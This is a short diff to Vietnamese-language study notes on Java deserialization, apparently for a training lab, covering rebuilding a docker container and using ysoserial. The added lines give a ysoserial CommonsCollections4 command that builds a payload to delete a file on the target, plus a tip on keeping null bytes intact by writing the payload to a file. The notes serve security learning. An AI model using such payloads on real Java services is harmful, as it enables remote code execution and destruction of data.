@@ -14,3 +14,5 @@
 #### Thay vì ngồi tự chỉnh nhờ java serialize cái payload 
 #### Java muốn thay đổi dữ liệu thì cần phải build lại "docker exec -it java_deserialize /home/cbjs/build.sh" (đây là câu lệnh biuld lại chương trình bên trên )
 # Dowload file ysoserial-all.jar để dùng tools (Releases)
+# java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' > raw.bin 
+#### Lưu vào file raw.bin có thể hiện null ẩn trong payload không bị mù như trên powershell
